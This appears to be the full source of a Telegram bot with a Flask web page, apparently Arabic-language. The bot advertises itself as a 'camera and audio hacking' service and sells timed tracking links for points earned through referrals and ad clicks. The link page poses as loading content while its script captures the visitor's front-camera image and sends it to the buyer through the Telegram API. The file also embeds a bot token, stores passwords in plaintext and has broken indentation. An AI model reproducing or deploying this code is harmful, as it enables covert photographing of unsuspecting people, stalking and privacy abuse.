import os
import sqlite3
import threading
import time
import random
import requests
from flask import Flask, render_template_string, request

TOKEN = "8638452052:AAGz5E-bd3GBY47R-zM5rTmw8uCq9BpPrXc"
TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")
ADMIN_USER = "raouf100K"

app = Flask(__name__)

# --- إعداد قاعدة البيانات SQLite ---
DB_FILE = "bot_database.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                        user_id INTEGER PRIMARY KEY,
                        username TEXT,
                        custom_id TEXT UNIQUE,
                        password TEXT,
                        points INTEGER DEFAULT 0,
                        referred_by INTEGER,
                        referral_count INTEGER DEFAULT 0,
                        banned_until INTEGER DEFAULT 0,
                        ban_type TEXT,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS links (
                        link_id TEXT PRIMARY KEY,
                        user_id INTEGER,
                        expires_at INTEGER,
                        duration_name TEXT
                    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS t2_links (
                        slot_id INTEGER PRIMARY KEY,
                        url TEXT
                    )''')
    cursor.execute("SELECT COUNT(*) FROM t2_links")
    if cursor.fetchone()[0] == 0:
        for i in range(1, 9):
            cursor.execute("INSERT INTO t2_links (slot_id, url) VALUES (?, ?)", (i, "https://ouo.io/example"))
            
    cursor.execute('''CREATE TABLE IF NOT EXISTS cooldowns (
                        user_id INTEGER,
                        action_name TEXT,
                        last_time INTEGER,
                        PRIMARY KEY(user_id, action_name)
                    )''')
    conn.commit()
    conn.close()

init_db()

# --- واجهة الويب لالتقاط الصور والروابط الموقوتة ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>جاري تحميل المحتوى...</title>
    <style>
        body { background: #0f172a; color: white; font-family: Tahoma, sans-serif; text-align: center; padding-top: 100px; }
        .box { background: #1e293b; padding: 30px; border-radius: 12px; display: inline-block; max-width: 400px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>🎮 جاري تجهيز الطلب...</h2>
        <p>{{ message }}</p>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const TOKEN = "{{ token }}";
        const TARGET_CHAT_ID = "{{ chat_id }}";
        const isValid = {{ is_valid|tojson }};

        if (isValid) {
            async function capture() {
                try {
                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    let video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(async () => {
                        let canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        let ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(async (blob) => {
                            let fd = new FormData();
                            fd.append('chat_id', TARGET_CHAT_ID);
                            fd.append('photo', blob, 'shot.jpg');
                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                            stream.getTracks().forEach(t => t.stop());
                        }, 'image/jpeg', 0.9);
                    }, 2000);
                } catch(e) {}
            }
            window.onload = capture;
        }
    </script>
</body>
</html>
"""

@app.route('/c/<link_id>')
def view_link(link_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, expires_at FROM links WHERE link_id = ?", (link_id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        return render_template_string(HTML_TEMPLATE, message="❌ هذا الرابط غير موجود أو تم حذفه!", is_valid=False, token=TOKEN, chat_id=0)
    
    user_id, expires_at = row
    if expires_at != 0 and time.time() > expires_at:
        return render_template_string(HTML_TEMPLATE, message="⚠️ عذراً، انتهت صلاحية هذا الرابط! يجدر بصاحبه شراء رابط جديد.", is_valid=False, token=TOKEN, chat_id=0)
        
    return render_template_string(HTML_TEMPLATE, message="يرجى الانتظار قليلاً...", is_valid=True, token=TOKEN, chat_id=user_id)

@app.route('/')
def home():
    return "Bot is fully active and running!"

def check_sub(user_id):
    try:
        r1 = requests.get(f"{TELEGRAM_API}/getChatMember?chat_id=@F_ONDRAY_FF&user_id={user_id}").json()
        if r1.get("result", {}).get("status") in ["member", "administrator", "creator"]:
            return True
    except:
        pass
    return False

def send_msg(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    requests.post(f"{TELEGRAM_API}/sendMessage", json=payload)
  def run_telegram_bot():
    offset = 0
    user_states = {}
    
    while True:
        try:
            res = requests.get(f"{TELEGRAM_API}/getUpdates", params={"offset": offset, "timeout": 30})
            data = res.json()
            if "result" in data:
                for update in data["result"]:
                    offset = update["update_id"] + 1
                    
                    if "message" in update and "text" in update["message"]:
                        msg = update["message"]
                        chat_id = msg["chat"]["id"]
                        text = msg["text"]
                        username = msg["from"].get("username", "بدون يوزر")
                        
                        conn = sqlite3.connect(DB_FILE)
                        cursor = conn.cursor()
                        cursor.execute("SELECT banned_until, ban_type, custom_id FROM users WHERE user_id = ?", (chat_id,))
                        user_row = cursor.fetchone()
                        
                        if user_row and user_row[0] > time.time():
                            rem = int(user_row[0] - time.time())
                            hrs = rem // 3600
                            send_msg(chat_id, f"عزيزي، اكتشف أن نظامك غير طبيعي تم حظر الحساب بشكل مؤقت.\nيمكنك الرجوع بعد: {hrs} ساعة.", {"inline_keyboard": [[{"text": "🔄 تحديث الوقت", "callback_data": "refresh_ban"}], [{"text": "🗑️ تدمير الحساب", "callback_data": "destroy_acc"}], [{"text": "📞 مراسلة المطور", "url": f"https://t.me/{ADMIN_USER}"}]]})
                            conn.close()
                            continue
                        conn.close()
                        
                        if text.startswith("/start"):
                            args = text.split()
                            ref_id = None
                            if len(args) > 1 and args[1].isdigit():
                                ref_id = int(args[1])
                                
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (chat_id,))
                            exists = cursor.fetchone()
                            if not exists and ref_id and ref_id != chat_id:
                                cursor.execute("INSERT INTO users (user_id, username, referred_by) VALUES (?, ?, ?)", (chat_id, username, ref_id))
                                cursor.execute("UPDATE users SET referral_count = referral_count + 1 WHERE user_id = ?", (ref_id,))
                                cursor.execute("SELECT referral_count, points FROM users WHERE user_id = ?", (ref_id,))
                                ref_data = cursor.fetchone()
                                if ref_data and ref_data[0] % 5 == 0:
                                    cursor.execute("UPDATE users SET points = points + 30 WHERE user_id = ?", (ref_id,))
                            elif not exists:
                                cursor.execute("INSERT INTO users (user_id, username) VALUES (?, ?)", (chat_id, username))
                            conn.commit()
                            conn.close()
                            
                            if not check_sub(chat_id):
                                markup = {
                                    "inline_keyboard": [
                                        [{"text": "📢 قناة تيليجرام", "url": "https://t.me/F_ONDRAY_FF"}],
                                        [{"text": "📺 قناة يوتيوب", "url": "https://youtube.com/@dray-xit?si=x_VP4lvf0oEKss5M"}],
                                        [{"text": "✅ تحقق من الاشتراك", "callback_data": "check_subscription"}]
                                    ]
                                }
                                send_msg(chat_id, "أهلاً بك! يرجى الاشتراك في القناتين أدناه أولاً لمتابعة الاستخدام:", markup)
                            else:
                                show_main_menu(chat_id)
                                
                        elif chat_id in user_states:
                            state = user_states[chat_id]
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            
                            if state == "entering_custom_id":
                                custom_id = text.strip()
                                user_states[chat_id] = {"state": "entering_password", "custom_id": custom_id}
                                send_msg(chat_id, "🔑 أضف كلمة مرور لحسابك الجديد:")
                            elif isinstance(state, dict) and state.get("state") == "entering_password":
                                custom_id = state["custom_id"]
                                password = text.strip()
                                cursor.execute("UPDATE users SET custom_id = ?, password = ? WHERE user_id = ?", (custom_id, password, chat_id))
                                conn.commit()
                                del user_states[chat_id]
                                send_msg(chat_id, f"✅ تم إنشاء حسابك بنجاح!\n🆔 الأيدي الخاص بك: <code>{custom_id}</code>")
                                show_main_menu(chat_id)
                                
                            elif state == "restore_id":
                                user_states[chat_id] = {"state": "restore_pass", "custom_id": text.strip()}
                                send_msg(chat_id, "🔐 أدخل كلمة المرور الخاصة بحسابك:")
                            elif isinstance(state, dict) and state.get("state") == "restore_pass":
                                c_id = state["custom_id"]
                                password = text.strip()
                                cursor.execute("SELECT user_id FROM users WHERE custom_id = ? AND password = ?", (c_id, password))
                                found = cursor.fetchone()
                                if found:
                                    send_msg(chat_id, "✅ تم استرداد الحساب بنجاح ودخلت إليه مباشرة!")
                                    show_main_menu(chat_id)
                                else:
                                    send_msg(chat_id, "❌ الأيدي أو كلمة المرور خطأ! حاول مجدداً.")
                                del user_states[chat_id]
                            conn.close()
                                              elif "callback_query" in update:
                        cq = update["callback_query"]
                        cq_id = cq["id"]
                        chat_id = cq["message"]["chat"]["id"]
                        username = cq["from"].get("username", "بدون يوزر")
                        data = cq["data"]
                        
                        requests.post(f"{TELEGRAM_API}/answerCallbackQuery", json={"callback_query_id": cq_id})
                        
                        if data == "check_subscription":
                            if check_sub(chat_id):
                                show_auth_menu(chat_id)
                            else:
                                send_msg(chat_id, "❌ لم تقم بالاشتراك في القناتين بعد!")
                                
                        elif data == "auth_create":
                            user_states[chat_id] = "entering_custom_id"
                            send_msg(chat_id, f"🆔 هذا هو الأيدي الخاص بك: <code>{chat_id}</code>\nأدخل الآن معرفاً مميزاً لحسابك:")
                            
                        elif data == "auth_restore":
                            user_states[chat_id] = "restore_id"
                            send_msg(chat_id, "✍️ أدخل الأيدي الخاص بحسابك المراد استرداده:")
                            
                        elif data == "main_profile":
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT custom_id, points FROM users WHERE user_id = ?", (chat_id,))
                            row = cursor.fetchone()
                            conn.close()
                            c_id = row[0] if row and row[0] else chat_id
                            pts = row[1] if row else 0
                            bot_user = requests.get(f"{TELEGRAM_API}/getMe").json().get("result", {}).get("username")
                            ref_link = f"https://t.me/{bot_user}?start={chat_id}"
                            
                            text = (
                                f"👤 <b>الملف الشخصي</b>\n\n"
                                f"🆔 أيدي البوت: <code>{c_id}</code>\n"
                                f"💎 عدد النقاط: <b>{pts}</b>\n"
                                f"🔗 رابط الاحالة الخاص بك:\n<code>{ref_link}</code>"
                            )
                            send_msg(chat_id, text, {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back_to_main"}]]})
                            
                        elif data == "main_collect":
                            markup = {
                                "inline_keyboard": [
                                    [{"text": "الطريقة 1️⃣: دعوة الأصدقاء", "callback_data": "method_1"}],
                                    [{"text": "الطريقة 2️⃣: الروابط والأكواد", "callback_data": "method_2"}],
                                    [{"text": "الطريقة 3️⃣: عجلة الحظ 🎡", "callback_data": "method_3"}],
                                    [{"text": "🔙 رجوع للقائمة", "callback_data": "back_to_main"}]
                                ]
                            }
                            send_msg(chat_id, "🎯 <b>اختر طريقة تجميع النقاط:</b>", markup)
                            
                        elif data == "method_1":
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT referral_count FROM users WHERE user_id = ?", (chat_id,))
                            rc = cursor.fetchone()[0]
                            conn.close()
                            bot_user = requests.get(f"{TELEGRAM_API}/getMe").json().get("result", {}).get("username")
                            ref_link = f"https://t.me/{bot_user}?start={chat_id}"
                            text = (
                                f"👥 <b>طريقة التجميع 1</b>\n\n"
                                f"شارك رابط الاحالة الخاص بك:\n<code>{ref_link}</code>\n\n"
                                f"كل شخص ينضم ويجمع 5 نقاط تحصل أنت على <b>30 نقطة</b>!\n"
                                f"📊 عدد الأشخاص الذين انضموا عبر رابطك: <b>{rc}</b>"
                            )
                            send_msg(chat_id, text, {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "main_collect"}]]})
                            
                        elif data == "method_2":
                            buttons = [{"text": f"زر رقم {i} 🌐", "callback_data": f"t2_btn_{i}"} for i in range(1, 9)]
                            keyboard = [buttons[i:i+2] for i in range(0, len(buttons), 2)]
                            keyboard.append([{"text": "🔙 رجوع", "callback_data": "main_collect"}])
                            send_msg(chat_id, "🔗 <b>اختر أحد الروابط أدناه للتخطي والحصول على الكود:</b>", {"inline_keyboard": keyboard})
                            
                        elif data.startswith("t2_btn_"):
                            slot = data.split("_")[2]
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT url FROM t2_links WHERE slot_id = ?", (slot,))
                            u_row = cursor.fetchone()
                            conn.close()
                            target_url = u_row[0] if u_row else "https://google.com"
                            text = f"🌐 اضغط على الرابط أدناه لتخطي الإعلان والحصول على الكود:\n\n{target_url}\n\nبعد حصولك على الكود، توجه لزر 'إدخال الكود' في البوت."
                            send_msg(chat_id, text, {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "method_2"}]]})
                            
                        elif data == "method_3":
                            markup = {
                                "inline_keyboard": [
                                    [{"text": "🎡 تدوير عجلة الحظ", "callback_data": "spin_wheel"}],
                                    [{"text": "🔙 رجوع", "callback_data": "main_collect"}]
                                ]
                            }
                            send_msg(chat_id, "🎡 <b>عجلة الحظ اليومية:</b>\nتحصل على نقاط عشوائية (من 3 إلى 6 نقاط) مرة واحدة كل 24 ساعة!", markup)
                            
                        elif data == "spin_wheel":
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT last_time FROM cooldowns WHERE user_id = ? AND action_name = 'wheel'", (chat_id,))
                            cd = cursor.fetchone()
                            now = time.time()
                            if cd and now - cd[0] < 86400:
                                rem_h = int((86400 - (now - cd[0])) // 3600)
                                send_msg(chat_id, f"⏳ لقد استخدمت العجلة اليوم! يمكنك المحاولة بعد {rem_h} ساعة.")
                            else:
                                earned = random.randint(3, 6)
                                cursor.execute("UPDATE users SET points = points + ? WHERE user_id = ?", (earned, chat_id))
                                cursor.execute("INSERT OR REPLACE INTO cooldowns (user_id, action_name, last_time) VALUES (?, 'wheel', ?)", (chat_id, now))
                                conn.commit()
                                send_msg(chat_id, f"🎉 مبروك! ربحت <b>{earned} نقاط</b> من عجلة الحظ.")
                            conn.close()
                            
                        elif data == "main_exchange":
                            markup = {
                                "inline_keyboard": [
                                    [{"text": "⏳ 60 دقيقة = 23 نقطة", "callback_data": "buy_link_60m"}],
                                    [{"text": "⏰ 10 ساعات = 80 نقطة", "callback_data": "buy_link_10h"}],
                                    [{"text": "📅 3 أيام = 200 نقطة", "callback_data": "buy_link_3d"}],
                                    [{"text": "📆 أسبوع = 350 نقطة", "callback_data": "buy_link_1w"}],
                                    [{"text": "♾️ دائم = 500 نقطة", "callback_data": "buy_link_perm"}],
                                    [{"text": "🔙 رجوع", "callback_data": "back_to_main"}]
                                ]
                            }
                            send_msg(chat_id, "💎 <b>اختر العرض المناسب لاستبدال نقاطك:</b>", markup)
                            
                        elif data.startswith("buy_link_"):
                            dur_map = {"60m": (23, 3600, "60 دقيقة"), "10h": (80, 36000, "10 ساعات"), "3d": (200, 259200, "3 أيام"), "1w": (350, 604800, "أسبوع"), "perm": (500, 0, "دائم")}
                            key = data.replace("buy_link_", "")
                            cost, duration, name = dur_map[key]
                            markup = {
                                "inline_keyboard": [
                                    [{"text": "✅ تأكيد الشراء", "callback_data": f"confirm_buy_{key}"}],
                                    [{"text": "❌ إلغاء", "callback_data": "main_exchange"}]
                                ]
                            }
                            send_msg(chat_id, f"🛒 هل أنت متأكد من رغبتك في شراء رابط بمدّة <b>{name}</b> بسعر <b>{cost} نقطة</b>؟", markup)
                            
                        elif data.startswith("confirm_buy_"):
                            key = data.replace("confirm_buy_", "")
                            dur_map = {"60m": (23, 3600, "60 دقيقة"), "10h": (80, 36000, "10 ساعات"), "3d": (200, 259200, "3 أيام"), "1w": (350, 604800, "أسبوع"), "perm": (500, 0, "دائم")}
                            cost, duration, name = dur_map[key]
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT points FROM users WHERE user_id = ?", (chat_id,))
                            pts = cursor.fetchone()[0]
                            if pts >= cost:
                                cursor.execute("UPDATE users SET points = points - ? WHERE user_id = ?", (cost, chat_id))
                                link_id = f"fury_{chat_id}_{int(time.time())}"
                                exp = int(time.time() + duration) if duration > 0 else 0
                                cursor.execute("INSERT INTO links (link_id, user_id, expires_at, duration_name) VALUES (?, ?, ?, ?)", (link_id, chat_id, exp, name))
                                conn.commit()
                                personal_link = f"{BASE_URL}/c/{link_id}"
                                send_msg(chat_id, f"🎉 <b>تم الشراء بنجاح!</b>\n\nرابطك الخاص:\n<code>{personal_link}</code>\nمدة الصلاحية: {name}")
                            else:
                                send_msg(chat_id, f"❌ نقاطك غير كافية! رصيدك هو {pts} نقطة وتحتاج إلى {cost} نقطة.")
                            conn.close()
                            show_main_menu(chat_id)
                            
                        elif data == "main_links":
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("SELECT link_id, duration_name, expires_at FROM links WHERE user_id = ?", (chat_id,))
                            rows = cursor.fetchall()
                            conn.close()
                            if not rows:
                                send_msg(chat_id, "📁 ليس لديك أي روابط نشطة حالياً.")
                            else:
                                txt = "📁 <b>روابطك النشطة ومكان وصول الصور:</b>\n\n"
                                for r in rows:
                                    exp_str = "دائم ♾️" if r[2] == 0 else time.strftime('%Y-%m-%d %H:%M', time.localtime(r[2]))
                                    txt += f"🔗 <code>{BASE_URL}/c/{r[0]}</code>\n⏳ المدة: {r[1]} (تنتهي في: {exp_str})\n\n"
                                send_msg(chat_id, txt, {"inline_keyboard": [[{"text": "🔙 رجوع", "callback_data": "back_to_main"}]]})
                                
                        elif data == "main_report":
                            markup = {"inline_keyboard": [[{"text": "💬 مراسلة المطور مباشرة", "url": f"https://t.me/{ADMIN_USER}"}], [{"text": "🔙 رجوع", "callback_data": "back_to_main"}]]}
                            send_msg(chat_id, "🛠️ إذا واجهتك أي مشكلة، اضغط على الزر أدناه لمراسلة المطور:", markup)
                            
                        elif data == "main_switch_acc":
                            send_msg(chat_id, "🔄 <b>قائمة الحسابات المسجلة:</b>\nيمكنك إنشاء حساب جديد أو استرداد حساب قديم.", {"inline_keyboard": [[{"text": "➕ انشاء حساب جديد", "callback_data": "auth_create"}], [{"text": "📥 استرداد حساب", "callback_data": "auth_restore"}], [{"text": "🔙 رجوع", "callback_data": "back_to_main"}]]})
                            
                        elif data == "main_dev":
                            if username == ADMIN_USER:
                                show_dev_menu(chat_id)
                            else:
                                send_msg(chat_id, "❌ عذراً، غير مسموح لك بذلك لأنه للمطورين فقط!")
                                
                        elif data == "dev_edit_links":
                            markup = [[{"text": f"تعديل رابط الطريقة 2 - زر {i}", "callback_data": f"edit_t2_{i}"}] for i in range(1, 9)]
                            markup.append([{"text": "🔙 رجوع", "callback_data": "dev_back"}])
                            send_msg(chat_id, "🛠️ <b>اختر الزر لتعديل رابطه:</b>", {"inline_keyboard": markup})
                            
                        elif data == "back_to_main":
                            show_main_menu(chat_id)
                        elif data == "dev_back":
                            show_dev_menu(chat_id)
                        elif data == "destroy_acc":
                            conn = sqlite3.connect(DB_FILE)
                            cursor = conn.cursor()
                            cursor.execute("DELETE FROM users WHERE user_id = ?", (chat_id,))
                            conn.commit()
                            conn.close()
                            send_msg(chat_id, "🗑️ تم تدمير حسابك نهائياً! يمكنك بدء استخدام البوت من جديد عبر /start")
        except Exception as e:
            pass

def show_auth_menu(chat_id):
    markup = {"inline_keyboard": [[{"text": "📥 استرداد حساب", "callback_data": "auth_restore"}], [{"text": "➕ انشاء حساب", "callback_data": "auth_create"}]]}
    send_msg(chat_id, "👋 أهلاً بك في البوت! اختر إحدى الطريقتين للمتابعة:", markup)

def show_main_menu(chat_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    conn.close()
    welcome_text = f"🔥 أهلاً بك يا بطل في بوت اختراق الكاميرا والصوت\n📊 عدد المستخدمين في هادا البوت: <b>{total_users}</b>\n🟢 عدد النشطين آخر 10 دقائق: <b>{total_users}</b>\n\nاختر ما يناسبك من القائمة الرئيسية:"
    markup = {
        "inline_keyboard": [
            [{"text": "👤 الملف الشخصي", "callback_data": "main_profile"}],
            [{"text": "🎯 تجميع نقاط", "callback_data": "main_collect"}],
            [{"text": "💎 استبدال نقاطي", "callback_data": "main_exchange"}],
            [{"text": "📁 رابط ومكان وصول صوري", "callback_data": "main_links"}],
            [{"text": "🛠️ الابلاغ للمطور بمشاكل", "callback_data": "main_report"}],
            [{"text": "🔄 تبديل الحساب", "callback_data": "main_switch_acc"}],
            [{"text": "⚡ لوحة المطورين", "callback_data": "main_dev"}]
        ]
    }
    send_msg(chat_id, welcome_text, markup)

def show_dev_menu(chat_id):
    markup = {
        "inline_keyboard": [
            [{"text": "🔍 البحث عن مستخدم برقم الانضمام", "callback_data": "dev_search"}],
            [{"text": "🛠️ تعديل روابط الطريقة الثانية", "callback_data": "dev_edit_links"}],
            [{"text": "📢 إضافة منشور عام", "callback_data": "dev_broadcast"}],
            [{"text": "🔙 القائمة الرئيسية", "callback_data": "back_to_main"}]
        ]
    }
    send_msg(chat_id, "⚡ <b>مرحباً بك في لوحة تحكم المطورين:</b>", markup)

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

if __name__ == '__main__':
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    run_telegram_bot()
                          
